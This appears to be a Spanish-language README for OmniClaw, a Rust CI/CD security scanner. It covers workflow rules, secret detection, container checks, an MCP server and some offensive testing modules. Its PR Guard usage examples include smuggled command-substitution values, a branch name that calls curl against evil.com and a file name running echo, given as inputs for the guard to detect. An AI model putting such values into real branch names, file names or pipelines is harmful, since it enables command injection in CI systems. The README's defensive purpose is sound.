# OmniClaw 🔒

**Escáner de Seguridad CI/CD Unificado** — Análisis completo de seguridad para pipelines de CI/CD.

OmniClaw es un escáner de seguridad nativo diseñado para identificar vulnerabilidades en flujos de trabajo de CI/CD y proteger contra vectores de ataque comunes.

---

## Características

### 🔍 Escaneo Completo
- **Análisis de Seguridad de Flujos de Trabajo**: Detecta disparadores privilegiados, inyección de entrada no confiable y saltos de autorización
- **Soporte Multi-Plataforma CI/CD**: GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure Pipelines, Travis CI
- **30+ Reglas de Seguridad**: Cobertura para vulnerabilidades críticas con mapeos CWE
- **Análisis Estructural YAML**: Análisis profundo para detectar cadenas de ataque de múltiples pasos

### 🛡️ PR Guard
- **Protección de Nombre de Rama**: Detecta sustitución de comandos y metacaracteres de shell
- **Validación de Nombres de Archivo**: Bloquea intentos de inyección a través de nombres de archivos
- **Análisis de Diff**: Detiene patrones de carga maliciosa conocidos
- **Protección de Configuración AI**: Identifica intentos de inyección de prompt en archivos de configuración AI

### 🔐 Detección Avanzada de Secretos
- **Análisis de Entropía**: Detecta cadenas de alta entropía que pueden ser secretos
- **Coincidencia de Patrones**: 15+ tipos de secretos (AWS, GitHub, GitLab, JWT, Stripe, etc.)
- **Contexto**: Contexto multilínea para mejor detección

### 🤖 Auto-Remediación
- **Soluciones Inteligentes**: Correcciones automáticas de código para vulnerabilidades comunes
- **Guía Detallada**: Instrucciones paso a paso de remediación
- **Evaluación de Riesgo**: Niveles de confianza y análisis de impacto

### 📦 Soporte SBOM
- **Escaneo de Dependencias**: npm, pip, Cargo, Go, Maven, Gradle
- **Detección de Vulnerabilidades**: Paquetes vulnerables conocidos
- **Exportación SPDX**: Formato SBOM estándar

### 🐳 Seguridad de Contenedores
- **Análisis de Dockerfile**: Mejores prácticas y problemas de seguridad
- **Seguridad Kubernetes**: Seguridad de pods, políticas de red, secretos
- **20+ Reglas de Contenedores**: Contenedores privilegiados, usuarios root, capacidades

### ⚙️ Motor de Reglas Personalizadas
- **Configuración YAML/JSON**: Define tus propias reglas de seguridad
- **Patrones Regex**: Coincidencia de patrones flexible
- **Filtrado por Tipo de Archivo**: Aplica reglas a tipos de archivo específicos

### 🛡️ Inteligencia de Amenazas
- **Dominios Maliciosos Conocidos**: Base de datos de amenazas integrada
- **Patrones de URL Maliciosas**: Patrones de explotación comunes
- **Exposición de Credenciales**: Detecta secretos comprometidos

### 🔒 Criptografía
- **Cifrado AES-256-GCM**: Almacenamiento seguro de hallazgos
- **Hash SHA-256/SHA-512**: Verificación de integridad de archivos
- **Generación Aleatoria Segura**: Tokens criptográficamente seguros

### 📊 Múltiples Formatos de Salida
- **Texto**: Salida de consola legible con color
- **JSON**: Datos estructurados completos para automatización
- **SARIF**: Integración con GitHub Code Scanning

### 🤖 Integración AI
- **Servidor MCP**: Integración con asistentes AI para flujos de trabajo de seguridad automatizados

### ⚠️ Herramientas de Seguridad Ofensiva (Solo Pruebas Autorizadas)
> **ADVERTENCIA**: Estas herramientas son **solo para pruebas de seguridad autorizadas**. Úsalas solo en sistemas que poseas o tengas permiso escrito para probar.

- **VulnerabilityProbe**: Detecta inyección de comandos, path traversal, patrones SSRF
- **ExploitSimulator**: Analiza debilidades de flujos de trabajo CI/CD (educativo/defensivo)
- **PayloadGenerator**: Genera cargas de prueba para pruebas de seguridad

### 🛡️ Herramientas de Seguridad Defensiva

- **PipelineHardener**: Analiza flujos de trabajo y proporciona recomendaciones de endurecimiento
- **VulnerabilityMitigator**: Genera mitigaciones para patrones de vulnerabilidad conocidos
- **DefensiveScanner**: Escanea configuraciones de seguridad incorrectas
- **Mejores Prácticas de Seguridad**: Verifica el cumplimiento de estándares de seguridad

---

## Instalación

### Desde Código Fuente

```bash
git clone https://github.com/omniclaw/omniclaw.git
cd omniclaw
cargo build --release
```

---

## Uso

### Escanear Flujos de Trabajo Locales

```bash
# Escanear ubicación predeterminada
omniclaw scan

# Escanear directorio específico
omniclaw scan path/to/workflows

# Escaneo profundo (recursivo)
omniclaw scan --deep

# Salida JSON
omniclaw scan --format json
```

### PR Guard

```bash
# Verificar nombre de rama
omniclaw guard --branch "fix/$(curl evil.com)"

# Verificar archivos
omniclaw guard --files '["$(echo hacked).md"]'
```

---

## Arquitectura

```
omniclaw/
├── src/
│   ├── core/          # Tipos principales
│   ├── rules/         # Reglas de seguridad
│   ├── scanner/       # Motores de escaneo
│   ├── pr_guard/      # Funcionalidad PR Guard
│   ├── secrets/       # Detección de secretos
│   ├── remediation/   # Auto-remediación
│   ├── sbom/          # Soporte SBOM
│   ├── container/     # Seguridad de contenedores
│   ├── rules_engine/  # Motor de reglas
│   ├── threat_intel/  # Inteligencia de amenazas
│   ├── crypto/        # Criptografía
│   ├── github/        # Integración API GitHub
│   ├── output/        # Formatos de salida
│   └── mcp/           # Servidor MCP
```

---

## ¿Por qué OmniClaw?

1. **Completo**: 50+ reglas de seguridad en múltiples dominios
2. **Detección Avanzada**: Análisis de entropía, inteligencia de amenazas
3. **Auto-Remediación**: Soluciones inteligentes con evaluación de riesgos
4. **Personalizable**: Define tus propias reglas de seguridad
5. **Seguridad Criptográfica**: Protege tus resultados de escaneo
6. **Multi-Plataforma**: GitHub, GitLab, Jenkins y más

---

## Licencia

Licencia dual bajo **MIT** y **Apache 2.0**.

---

**OmniClaw** 🔒 - Escáner de Seguridad CI/CD Unificado

*Creado con ❤️ por [Maustral](https://github.com/Maustral)*

Instagram: @yojancelm02

